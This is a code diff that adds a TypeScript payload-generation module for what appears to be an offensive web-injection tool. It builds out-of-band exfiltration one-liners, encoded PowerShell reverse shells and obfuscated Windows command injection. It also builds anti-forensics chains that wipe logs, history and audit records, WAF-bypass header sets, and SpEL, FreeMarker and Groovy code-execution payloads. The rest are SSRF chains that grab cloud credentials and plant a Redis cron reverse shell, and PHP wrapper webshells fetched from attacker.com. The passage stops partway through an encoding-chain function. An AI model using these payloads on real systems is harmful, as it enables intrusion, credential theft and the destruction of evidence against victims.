+    `_O=$(${cmd}${IFS}2>&1);python${IFS}-c${IFS}"import urllib2,base64,os;urllib2.urlopen('${oobUrl}/${tok}?d='+base64.b64encode(os.popen(${JSON.stringify(cmd)}).read(512)))" 2>/dev/null &`,
+    `_O=$(${cmd}${IFS}2>&1);_B=$(printf${IFS}'%s'${IFS}"$_O"|head${IFS}-c128|tr${IFS}-cd${IFS}'[:alnum:]');exec${IFS}3>/dev/tcp/${host}/${oobPort};printf${IFS}"GET /${tok}?d=$_B HTTP/1.0\r\nHost:${IFS}${host}\r\nConnection:${IFS}close\r\n\r\n">&3 2>/dev/null &`,
+    `_O=$(${cmd}${IFS}2>&1|head${IFS}-c30|tr${IFS}-cd${IFS}'[:alnum:]');nslookup${IFS}"$_O.${host}" 2>/dev/null &`,
+    `_O=$(${cmd}${IFS}2>&1);openssl${IFS}s_client${IFS}-quiet${IFS}-connect${IFS}${host}:${oobPort}${IFS}<<<$(printf${IFS}"GET /${tok}?d=$(printf${IFS}'%s'${IFS}"$_O"|tr${IFS}-cd${IFS}'A-Za-z0-9+/='|head${IFS}-c150) HTTP/1.0\r\nHost:${IFS}${host}\r\n\r\n") 2>/dev/null &`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WINDOWS TIMING ORACLE — ping -n / timeout / Start-Sleep timing (no sleep)
+   All use built-in Windows binaries present on every Windows version.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildWindowsTimingPayloads(delaySec = 7): string[] {
+  const d  = String(Math.floor(delaySec));
+  const ms = String(Math.floor(delaySec) * 1000);
+  return [
+    `& ping -n ${d} 127.0.0.1`,
+    `| ping -n ${d} 127.0.0.1`,
+    `%0aping -n ${d} 127.0.0.1%0a`,
+    `\r\nping -n ${d} 127.0.0.1`,
+    `& ping -n ${d} ::1`,
+    `| ping -n ${d} ::1`,
+    `& timeout /T ${d} /NOBREAK`,
+    `| timeout /T ${d} /NOBREAK`,
+    `& powershell -c "Start-Sleep -Seconds ${d}"`,
+    `| powershell -c "Start-Sleep -Milliseconds ${ms}"`,
+    `& powershell -w hidden -c "[System.Threading.Thread]::Sleep(${ms})"`,
+    `& w32tm /stripchart /computer:127.0.0.1 /samples:${d} /dataonly 2>nul`,
+    `& waitfor /T ${d} NEXTEST 2>nul`,
+    `& choice /T ${d} /C YN /D Y >nul`,
+    `& cmd /V:ON /c "set _S=!TIME!&ping -n ${d} 127.0.0.1>nul"`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WINDOWS REVERSE SHELLS — PowerShell TCP reverse shells (encoded UTF-16LE)
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildWindowsReverseShells(ip: string, port: string): string[] {
+  const psB64 = (s: string): string => {
+    const buf = Buffer.alloc(s.length * 2);
+    for (let i = 0; i < s.length; i++) buf.writeUInt16LE(s.charCodeAt(i), i * 2);
+    return buf.toString("base64");
+  };
+  const full = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sB=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sB,0,$sB.Length);$s.Flush()};$c.Close()`;
+  const mini = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($st,0,$st.Length)}`;
+  const encFull = psB64(full);
+  const encMini = psB64(mini);
+  return [
+    `& powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${encFull}`,
+    `| powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${encFull}`,
+    `; powershell -enc ${encFull}`,
+    `& powershell -enc ${encMini}`,
+    `& %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ${encFull}`,
+    `& cmd /c "powershell -enc ${encFull}"`,
+    `& mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ${encFull}"",0,True(close)")`,
+    `& wmic process call create "powershell -enc ${encMini}"`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WINDOWS PAYLOADS — CMD.EXE + PowerShell injection for Windows targets
+   Techniques: cmd metachar, caret obfuscation, %COMSPEC%, empty-string split,
+   env-var path resolution, PowerShell direct, PowerShell -EncodedCommand
+   (UTF-16LE base64), PS obfuscation, WMI, mshta VBScript, tab/pct09 spaces,
+   delayed-expansion /V:ON, for-loop execution, .NET Process::Start.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildWindowsPayloads(cmd: string): string[] {
+  const psBuf = Buffer.alloc(cmd.length * 2);
+  for (let i = 0; i < cmd.length; i++) psBuf.writeUInt16LE(cmd.charCodeAt(i), i * 2);
+  const psEnc = psBuf.toString("base64");
+
+  const wrapPs    = `powershell -c "${cmd.replace(/"/g, '\\"')}"`;
+  const wrapPsRaw = `Start-Sleep -Seconds 0;${cmd}`;
+  const psWrapBuf = Buffer.alloc(wrapPsRaw.length * 2);
+  for (let i = 0; i < wrapPsRaw.length; i++) psWrapBuf.writeUInt16LE(wrapPsRaw.charCodeAt(i), i * 2);
+  const psWrapEnc = psWrapBuf.toString("base64");
+
+  const qCmd   = cmd.replace(/"/g, '""');
+  const bsCmd  = cmd.replace(/"/g, '\\"');
+  const tabCmd = cmd.replace(/ /g, "\t");
+  const p09Cmd = cmd.replace(/ /g, "%09");
+  const caretBin = (cmd.split(" ")[0] ?? cmd).split("").map((c, i, a) =>
+    /[a-zA-Z]/.test(c) && i < a.lastIndexOf(c) + 1 ? `${c}^` : c).join("");
+
+  return [
+    `& cmd /c ${cmd}`,
+    `| cmd /c ${cmd}`,
+    `\r\ncmd /c ${cmd}`,
+    `%0acmd /c ${cmd}`,
+    `%0Acmd /c ${cmd}`,
+    `%0d%0acmd /c ${cmd}`,
+    `& c^m^d /c ${cmd}`,
+    `& "cmd" /c ${cmd}`,
+    `& cm""d /c ${cmd}`,
+    `& %COMSPEC% /c ${cmd}`,
+    `& %ComSpec% /c ${cmd}`,
+    `& %SystemRoot%\\System32\\cmd.exe /c ${cmd}`,
+    `& %WinDir%\\System32\\cmd.exe /c ${cmd}`,
+    `& cmd /V:ON /c "${qCmd}"`,
+    `& cmd\t/c\t${tabCmd}`,
+    `& ${p09Cmd}`,
+    `& ${caretBin} ${cmd.split(" ").slice(1).join(" ")}`,
+    `& for /f "delims=" %x in ('${qCmd}') do @echo %x`,
+    `; ${wrapPs}`,
+    `| powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "${bsCmd}"`,
+    `& powershell -w hidden -c "${bsCmd}"`,
+    `& p^o^w^e^r^s^h^e^l^l -c "${bsCmd}"`,
+    `& po""wer""she""ll -c "${bsCmd}"`,
+    `& powershell -enc ${psEnc}`,
+    `| powershell -enc ${psEnc}`,
+    `& powershell -w hidden -NoP -NonI -Exec Bypass -enc ${psEnc}`,
+    `& powershell -enc ${psWrapEnc}`,
+    `& %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ${psEnc}`,
+    `& powershell -c "[System.Diagnostics.Process]::Start('cmd','/c ${bsCmd}')"`,
+    `& powershell -c "Invoke-Expression([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${psEnc}')))"`,
+    `& wmic process call create "${qCmd}"`,
+    `& wmic process call create "cmd.exe /c ${qCmd}"`,
+    `& mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c ${qCmd}"",0,True(close)")`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   ANTI-FORENSICS PAYLOADS — Linux zero-trace evidence elimination
+   Tiers:
+     1. History suppression   — HISTFILE, unset, history -c, shred
+     2. Log obliteration      — truncate/dd all auth,syslog,kern,audit,
+                                nginx,apache,mysql,postgres,cron,fail2ban
+     3. Login record wipe     — wtmp, btmp, lastlog, utmp (who/last/lastlog)
+     4. Syslog daemon control — SIGSTOP before exec, SIGCONT after wipe
+     5. Auditd neutralisation — auditctl -e 0, service stop, rule flush
+     6. Filesystem forensics  — touch timestamp reset, shred -n3, /dev/shm exec
+     7. Proc masking          — exec -a, setsid, unshare -m, env -i
+     8. Temp / cache wipe     — /tmp, /var/tmp, /dev/shm, ~/.cache, /run/user
+     9. SSH artefact removal  — known_hosts, auth.log ssh entries
+    10. Named-pipe execution  — no cmdline args in ps output for the payload
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildAntiForensicsPayloads(cmd: string): string[] {
+  const Q = JSON.stringify(cmd);
+
+  const HIST_SUPPRESS = [
+    "HISTFILE=/dev/null",
+    "export HISTFILE",
+    "unset HISTSIZE HISTFILESIZE HISTCONTROL HISTLOG HISTDUP",
+    "export HISTIGNORE='*'",
+    "history -c 2>/dev/null",
+    "history -w /dev/null 2>/dev/null",
+  ].join(";");
+
+  const HIST_WIPE = [
+    "cat /dev/null > ~/.bash_history 2>/dev/null",
+    "cat /dev/null > ~/.zsh_history 2>/dev/null",
+    "rm -f ~/.bash_history ~/.zsh_history ~/.sh_history ~/.python_history 2>/dev/null",
+    "rm -f ~/.node_repl_history ~/.irb_history ~/.psql_history ~/.mysql_history 2>/dev/null",
+    "rm -f ~/.local/share/fish/fish_history ~/.config/fish/fish_history 2>/dev/null",
+  ].join(";");
+
+  const HIST_SHRED = [
+    "shred -n3 -u -z ~/.bash_history 2>/dev/null||true",
+    "shred -n3 -u -z ~/.zsh_history 2>/dev/null||true",
+  ].join(";");
+
+  const LOG_LIST = [
+    "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
+    "/var/log/kern.log", "/var/log/secure", "/var/log/user.log",
+    "/var/log/daemon.log", "/var/log/mail.log", "/var/log/cron.log",
+    "/var/log/cron", "/var/log/dpkg.log", "/var/log/apt/history.log",
+    "/var/log/dnf.log", "/var/log/yum.log", "/var/log/faillog",
+    "/var/log/audit/audit.log", "/var/log/fail2ban.log",
+    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
+    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
+    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
+    "/var/log/mysql/mysql.log", "/var/log/mysql/error.log",
+    "/var/log/postgresql/postgresql.log",
+  ];
+
+  const LOG_TRUNC = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&truncate -s0 "$_NXL" 2>/dev/null;done`;
+  const LOG_DD    = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&dd if=/dev/zero of="$_NXL" bs=1 count=1 conv=notrunc 2>/dev/null;done`;
+  const LOG_SHRED = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&shred -n2 -z "$_NXL" 2>/dev/null&&truncate -s0 "$_NXL" 2>/dev/null;done`;
+
+  const LOGIN_WIPE = [
+    "cat /dev/null > /var/log/wtmp 2>/dev/null",
+    "cat /dev/null > /var/log/btmp 2>/dev/null",
+    "cat /dev/null > /var/log/lastlog 2>/dev/null",
+    "cat /dev/null > /run/utmp 2>/dev/null",
+    "utmpdump /var/log/wtmp 2>/dev/null|grep -v \"$(id -un 2>/dev/null)\"|utmpdump -r -o /var/log/wtmp 2>/dev/null",
+  ].join(";");
+
+  const TMP_CLEAN = [
+    "find /tmp /var/tmp /dev/shm -maxdepth 4 -newer /proc/self -delete 2>/dev/null",
+    "find /run/user -maxdepth 3 -newer /proc/self -delete 2>/dev/null",
+    "find ~/.cache -maxdepth 3 -newer /proc/self -delete 2>/dev/null",
+  ].join(";");
+
+  const AUDIT_KILL = [
+    "auditctl -e 0 2>/dev/null",
+    "auditctl -D 2>/dev/null",
+    "service auditd stop 2>/dev/null",
+    "systemctl stop auditd 2>/dev/null",
+    "kill -9 $(pidof auditd) 2>/dev/null",
+  ].join(";");
+
+  const SYSLOG_STOP = "kill -19 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";
+  const SYSLOG_KILL = "kill -9 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";
+  const SYSLOG_CONT = "kill -18 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";
+
+  const SSH_CLEAN = [
+    "cat /dev/null > ~/.ssh/known_hosts 2>/dev/null",
+    "rm -f ~/.ssh/known_hosts ~/.ssh/known_hosts.old 2>/dev/null",
+    "truncate -s0 ~/.ssh/authorized_keys 2>/dev/null",
+  ].join(";");
+
+  const TS_RESET = "touch -r /etc/hosts ~/.bash_history ~/.zsh_history 2>/dev/null";
+  const TS_PAST  = "touch -d '2020-01-01 00:00:00' ~/.bash_history 2>/dev/null";
+
+  const CLEAN_FAST = `${HIST_SUPPRESS};${HIST_WIPE};${LOGIN_WIPE}`;
+  const CLEAN_FULL = `${HIST_SUPPRESS};${HIST_WIPE};${LOG_TRUNC};${LOGIN_WIPE};${TMP_CLEAN};${AUDIT_KILL};${SSH_CLEAN}`;
+  const CLEAN_DEEP = `${AUDIT_KILL};${SYSLOG_KILL};${HIST_SUPPRESS};${HIST_WIPE};${HIST_SHRED};${LOG_SHRED};${LOGIN_WIPE};${TMP_CLEAN};${SSH_CLEAN};${TS_RESET}`;
+
+  return [
+    `${cmd};${CLEAN_FAST}`,
+    `${HIST_SUPPRESS};${cmd};${HIST_WIPE}`,
+    `(HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 ${cmd})`,
+    `${SYSLOG_STOP};${cmd};${CLEAN_FULL};${SYSLOG_CONT}`,
+    `${AUDIT_KILL};${cmd};${CLEAN_FULL}`,
+    `exec -a '[kworker/0:0]' sh -c ${Q};${CLEAN_FAST}`,
+    `setsid sh -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
+    `unshare -m sh -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
+    `env -i HOME=$HOME PATH=$PATH TERM=xterm sh -c ${Q};${HIST_WIPE}`,
+    `bash --norc --noprofile -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
+    `_NXR=$(${cmd} 2>&1);echo "$_NXR";${CLEAN_FAST}`,
+    `strace -o /dev/null -e trace=none ${cmd} 2>/dev/null;${CLEAN_FAST}`,
+    `_NXP=$(mktemp /dev/shm/.XXXXXXXXXX);printf '%s' ${Q}>$_NXP;chmod 700 $_NXP;sh $_NXP;shred -u $_NXP 2>/dev/null;${HIST_SUPPRESS}`,
+    `${cmd};${LOG_TRUNC}`,
+    `${cmd};${LOG_DD}`,
+    `${cmd};${LOGIN_WIPE}`,
+    `${cmd};${TMP_CLEAN}`,
+    `${cmd};${HIST_SHRED};${HIST_SUPPRESS}`,
+    `${cmd};${SSH_CLEAN};${HIST_SUPPRESS};${HIST_WIPE}`,
+    `${cmd};${TS_PAST};${HIST_SUPPRESS}`,
+    `${SYSLOG_STOP};${AUDIT_KILL};${cmd};${LOG_SHRED};${LOGIN_WIPE};${HIST_WIPE};${SYSLOG_CONT}`,
+    `${cmd};${CLEAN_DEEP}`,
+    `_NXF=$(mktemp -u /tmp/.XXXXXXXXXX);mkfifo $_NXF 2>/dev/null;${cmd}>$_NXF & cat $_NXF;rm -f $_NXF 2>/dev/null;${HIST_SUPPRESS}`,
+    `${AUDIT_KILL};${SYSLOG_KILL};${cmd};${CLEAN_DEEP}`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WAF-SPECIFIC BYPASS HEADERS — per-product optimised header sets
+   Cloudflare, Akamai, AWS WAF, Imperva, F5 BIG-IP, ModSecurity
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildWafSpecificHeaders(waf: string): Array<Record<string, string>> {
+  const w   = waf.toLowerCase();
+  const rid = () => Math.random().toString(36).slice(2, 12);
+  const base = buildHttpBypassHeaders();
+
+  if (w.includes("cloudflare")) {
+    return [
+      ...base,
+      {
+        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "CF-Connecting-IP": "127.0.0.1",
+        "CF-IPCountry":     "US",
+        "CF-RAY":           `${rid()}-IAD`,
+        "CF-Visitor":       '{"scheme":"https"}',
+        "X-Forwarded-For":  "127.0.0.1",
+        "X-Real-IP":        "127.0.0.1",
+        "True-Client-IP":   "127.0.0.1",
+      },
+      {
+        "User-Agent":       "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "From":             "googlebot(at)googlebot.com",
+        "X-Forwarded-For":  "66.249.66.1",
+        "CF-Connecting-IP": "66.249.66.1",
+        "True-Client-IP":   "66.249.66.1",
+      },
+      {
+        "User-Agent":       "Cloudflare-Traffic-Manager/1.0",
+        "X-Forwarded-For":  "127.0.0.1",
+        "X-Real-IP":        "127.0.0.1",
+        "CF-Worker":        "example.workers.dev",
+        "CF-Connecting-IP": "::1",
+      },
+      {
+        "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "CF-IPCountry":    "XX",
+        "CF-Connecting-IP":"0.0.0.0",
+        "X-Forwarded-For": "0.0.0.0",
+        "True-Client-IP":  "0.0.0.0",
+      },
+    ];
+  }
+
+  if (w.includes("akamai")) {
+    return [
+      ...base,
+      {
+        "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "X-Akamai-CIP":      "127.0.0.1",
+        "True-Client-IP":    "127.0.0.1",
+        "X-Forwarded-For":   "127.0.0.1",
+        "Akamai-Origin-Hop": "1",
+        "X-Check-Cacheable": "YES",
+      },
+      {
+        "User-Agent":               "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "X-Akamai-Config-Log-Detail":"true",
+        "X-Akamai-Debug-Pragma":    "akamai-x-check-cacheable",
+        "X-Forwarded-For":          "127.0.0.1",
+        "X-Real-IP":                "127.0.0.1",
+        "True-Client-IP":           "127.0.0.1",
+      },
+    ];
+  }
+
+  if (w.includes("aws")) {
+    return [
+      ...base,
+      {
+        "User-Agent":       "AmazonCloudFront",
+        "X-Forwarded-For":  "127.0.0.1",
+        "X-Amzn-Trace-Id":  `Root=1-${rid()}-${rid()}`,
+        "X-Amz-Cf-Id":      rid(),
+        "Via":              `1.1 ${rid()}.cloudfront.net (CloudFront)`,
+        "X-Real-IP":        "127.0.0.1",
+      },
+      {
+        "User-Agent":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "X-Forwarded-For":  "127.0.0.1",
+        "X-Amzn-Trace-Id":  `Self=1-${rid()}-${rid()}`,
+        "X-Real-IP":        "127.0.0.1",
+        "X-Forwarded-Port": "443",
+      },
+    ];
+  }
+
+  if (w.includes("imperva") || w.includes("incapsula")) {
+    return [
+      ...base,
+      {
+        "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "Incap-Client-IP":   "127.0.0.1",
+        "X-Forwarded-For":   "127.0.0.1",
+        "X-Real-IP":         "127.0.0.1",
+        "X-Originating-IP":  "127.0.0.1",
+      },
+    ];
+  }
+
+  if (w.includes("f5") || w.includes("big-ip")) {
+    return [
+      ...base,
+      {
+        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "X-Forwarded-For":  "127.0.0.1",
+        "X-Real-IP":        "127.0.0.1",
+        "F5-CSF":           "F5",
+        "X-F5-Auth-Token":  rid(),
+      },
+    ];
+  }
+
+  if (w.includes("modsecurity") || w.includes("modsec") || w.includes("406")) {
+    return [
+      ...base,
+      {
+        "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+        "Content-Type":  "application/x-www-form-urlencoded ; charset=utf-8",
+        "X-Forwarded-For":"127.0.0.1",
+        "X-Real-IP":     "127.0.0.1",
+      },
+      {
+        "User-Agent":    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Content-Type":  "application/x-www-form-urlencoded\t",
+        "X-Forwarded-For":"127.0.0.1",
+        "X-Real-IP":     "127.0.0.1",
+      },
+    ];
+  }
+
+  return base;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SPRING EXPRESSION LANGUAGE (SpEL) INJECTION
+   Targets Spring Framework, Spring Boot, Spring Security expression contexts
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildSpelPayloads(cmd: string): string[] {
+  const e   = cmd.replace(/'/g, "\\'").replace(/"/g, '\\"');
+  const b64c = b64(cmd);
+  return [
+    `${"\${"}T(java.lang.Runtime).getRuntime().exec('${e}')${"}"}`,
+    `#{"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${e}")}`,
+    `*{T(java.lang.Runtime).getRuntime().exec(new String(T(org.springframework.util.Base64Utils).decodeFromString('${b64c}')))}`,
+    `${"\${"}T(java.lang.ProcessBuilder).new(new String[]{"/bin/bash","-c","${e}"}).start()${"}"}`,
+    `${"\${"}T(java.lang.System).getenv()${"}"}`,
+    `${"\${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","${e}"})${"}"}`,
+    `${"\${"}T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('${e}').getInputStream())${"}"}`,
+    `#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('${e}').getInputStream()).useDelimiter('\\\\A').next()}`,
+    `${"\${"}new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))${"}"}`,
+    `${"\${"}T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'${e}')${"}"}`,
+    `${"\${"}T(java.lang.Runtime).getRuntime().exec('id')${"}"}`,
+    `__${"\${"}T(java.lang.Runtime).getRuntime().exec('${e}')${"}"}__`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FREEMARKER TEMPLATE INJECTION
+   Targets Apache FreeMarker — used by Spring MVC, Alfresco, Jenkins, Liferay
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildFreemarkerPayloads(cmd: string): string[] {
+  const e = cmd.replace(/"/g, '\\"').replace(/'/g, "\\'");
+  return [
+    `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("${e}")}`,
+    `[#assign ex = "freemarker.template.utility.Execute"?new()][#assign o = ex("${e}")]${"\${o}"}`,
+    `<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${"\${dwf.newInstance(ec,null)(\"${e}\")}"}`,
+    `<#assign uri=object?api.class.getResource("/")><#assign input=uri?api.toURI()?api.resolve("file:///etc/passwd")?api.toURL()?api.openStream()><#assign r=input?api.read(8192)>`,
+    `<#assign walker=["freemarker.template.utility.Execute"]?new()>${"\${walker(\"${e}\")}"}`,
+    `<#list "freemarker.template.utility.Execute"?new()("${e}")?split("\\n") as line>${"\${line}"}</#list>`,
+    `<#assign s = "freemarker.template.utility.Execute"?new()><#assign result = s("${e}")>${"\${result}"}`,
+    `<#attempt><#assign s="freemarker.template.utility.Execute"?new()>${"\${s(\"${e}\")"}<#recover></#attempt>`,
+    `${"${\"freemarker.template.utility.Execute\"?new()(\"${e}\")}"}`,
+    `<#setting locale="en_US"><#assign ex="freemarker.template.utility.Execute"?new()>${"\${ex(\"${e}\")}"}`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   GROOVY SCRIPT INJECTION
+   Targets Jenkins Script Console, Grails, Gradle build scripts, Groovy Console
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildGroovyPayloads(cmd: string): string[] {
+  const e   = cmd.replace(/"/g, '\\"').replace(/'/g, "\\'");
+  const b64c = b64(cmd);
+  return [
+    `"${e}".execute().text`,
+    `def c = "${e}".execute(); c.waitFor(); c.text`,
+    `['bash','-c','${e}'].execute().text`,
+    `['/bin/sh','-c','${e}'].execute().text`,
+    `def p = new ProcessBuilder(["/bin/sh","-c","${e}"]).redirectErrorStream(true).start(); p.inputStream.text`,
+    `def cmd="${e}"; def proc=cmd.execute(); proc.waitFor(); proc.text`,
+    `new GroovyShell().evaluate("'${e}' as GString")`,
+    `Runtime.runtime.exec("${e}").text`,
+    `this.class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("${e}").text`,
+    `new String("${e}".execute().in.bytes)`,
+    `groovy.util.Eval.me("'${e}'.execute().text")`,
+    `[cmd:['bash','-c','${e}'],env:System.getenv()].cmd.execute().text`,
+    `def b=new String(Base64.decoder.decode('${b64c}')); b.execute().text`,
+    `println "cmd /c ${e}".execute().text`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SSRF PAYLOAD CHAINS — internal service pivoting and credential theft
+   Targets: cloud IMDS, localhost services (Redis, Memcached, Elasticsearch),
+   internal admin panels, Kubernetes API, Docker socket
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildSsrfPayloads(cmd: string): string[] {
+  return [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://100.100.100.200/latest/meta-data/",
+    "dict://127.0.0.1:6379/info",
+    "dict://127.0.0.1:6379/config%20get%20*",
+    "gopher://127.0.0.1:6379/_INFO%0d%0a",
+    "gopher://127.0.0.1:6379/_SLAVEOF%20127.0.0.1%206379%0d%0a",
+    "dict://127.0.0.1:11211/stat",
+    "dict://127.0.0.1:11211/slabs",
+    "http://127.0.0.1:9200/_cat/indices",
+    "http://127.0.0.1:9200/_cluster/health",
+    "http://127.0.0.1:8500/v1/kv/?recurse",
+    "http://127.0.0.1:2375/containers/json",
+    "http://127.0.0.1:2375/info",
+    "http://127.0.0.1:10250/pods",
+    "http://127.0.0.1:10255/pods",
+    "https://kubernetes.default.svc/api/v1/pods",
+    "http://127.0.0.1:8080/actuator/env",
+    "http://127.0.0.1:8080/actuator/heapdump",
+    "http://127.0.0.1:4040/api/tunnels",
+    "file:///etc/passwd",
+    "file:///etc/shadow",
+    "file:///proc/self/environ",
+    "file:///proc/self/cmdline",
+    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+    "http://[::1]/",
+    "http://0177.0.0.1/",
+    "http://0x7f000001/",
+    `http://127.0.0.1:80/?${cmd}`,
+    `gopher://127.0.0.1:6379/_SET%20cmd%20"\n\n*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/attacker/4444%200>&1\n\n"\r\nCONFIG%20SET%20dir%20/var/spool/cron/\r\nCONFIG%20SET%20dbfilename%20root\r\nSAVE\r\n`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   PHP WRAPPER INJECTION — stream wrappers for LFI/RFI/RCE escalation
+   Targets PHP apps using include/require on user-controlled input
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildPhpWrapperPayloads(cmd: string): string[] {
+  const b64webshell = b64(`<?php system($_GET['c']); ?>`);
+  const b64cmd      = b64(`<?php system('${cmd.replace(/'/g, "\\'")}'); ?>`);
+  const b64proc     = b64(`<?php $d=proc_open('${cmd.replace(/'/g,"\\'")}',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p);echo stream_get_contents($p[1]);?>`);
+  return [
+    `php://filter/convert.base64-encode/resource=/etc/passwd`,
+    `php://filter/read=string.rot13/resource=/etc/passwd`,
+    `php://filter/read=convert.base64-encode/resource=index.php`,
+    `php://filter/read=convert.base64-encode|convert.base64-encode/resource=/etc/passwd`,
+    `php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd`,
+    `data://text/plain;base64,${b64cmd}`,
+    `data://text/plain,<?php system('${cmd.replace(/'/g,"\\'")}'); ?>`,
+    `expect://${cmd}`,
+    `php://input`,
+    `phar://./uploads/shell.phar/shell.php`,
+    `zip://uploads/shell.zip#shell.php`,
+    `compress.zlib://http://attacker.com/shell.php`,
+    `php://filter/convert.base64-decode/resource=data://text/plain,${b64webshell}`,
+    `data://text/plain;base64,${b64webshell}`,
+    `data://text/plain;base64,${b64proc}`,
+    `php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=/etc/passwd`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   MULTI-LAYER ENCODING CHAINS — bypass WAFs that decode only once
+   Combinations: URL+URL, URL+HTML, B64+URL, Unicode+URL, hex+B64, etc.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildEncodingChains(payload: string): string[] {
+  const u1  = urlEnc(payload);
+  const u2  = dblUrlEnc(payload);
+  const b   = b64(payload);
+  const bU  = b64url(payload);
+  const h   = hexEsc(payload);
+  const rh  = rawHex(payload);
